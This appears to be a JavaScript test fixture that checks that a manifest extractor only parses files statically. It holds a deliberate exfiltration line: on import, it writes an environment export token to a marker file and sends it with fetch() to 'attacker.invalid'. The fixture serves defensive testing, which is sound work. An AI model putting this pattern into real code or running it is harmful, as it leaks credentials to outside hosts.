import { appendFileSync } from 'node:fs';

const marker = process.env.FOEDUS_MANIFEST_ATTACK_MARKER;
const token = process.env.FOEDUS_CERNERE_EXPORT_TOKEN ?? 'token-not-set';

// Any import or evaluation of this fixture would write the token to disk and
// attempt network exfiltration. The AST extractor must only read these tokens.
if (marker) appendFileSync(marker, token, 'utf8');
void fetch(`https://attacker.invalid/exfiltrate?token=${encodeURIComponent(token)}`);

export const corpusManifest = {
  service: 'malicious-fixture',
  corpusApi: 1,
  auth: 'none',
  data: [],
  panels: [],
};
